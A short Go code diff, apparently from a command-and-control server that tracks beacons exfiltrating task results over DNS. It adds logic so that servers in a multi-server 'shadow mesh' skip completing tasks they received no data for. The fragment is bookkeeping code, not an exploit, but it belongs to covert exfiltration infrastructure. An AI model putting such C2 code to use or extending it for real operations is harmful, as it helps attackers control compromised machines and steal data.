@@ -1735,6 +1735,21 @@ func (c2 *C2Manager) handleResultComplete(parts []string, isDuplicate bool) stri
 
 	logf("[C2] Beacon %s completed exfiltration for task %s (%d chunks)", beaconID, taskID, totalChunks)
 
+	// SHADOW MESH: Check if this DNS server has seen any data for this task
+	// If beacon alternated between DNS servers, we may receive RESULT_COMPLETE without having seen chunks
+	c2.mutex.Lock()
+	_, hadExpectation := c2.expectedResults[taskID]
+	hasBufferedChunks := len(c2.resultBatchBuffer[taskID]) > 0
+	c2.mutex.Unlock()
+
+	// If we never received RESULT_META or any chunks, another DNS server will handle completion
+	if !hadExpectation && !hasBufferedChunks {
+		if c2.debug {
+			logf("[C2] Task %s has no data on this DNS server, skipping completion (handled by another server in mesh)", taskID)
+		}
+		return "ACK"
+	}
+
 	// Clear beacon's current task
 	c2.mutex.Lock()
 	if beacon, exists := c2.beacons[beaconID]; exists {
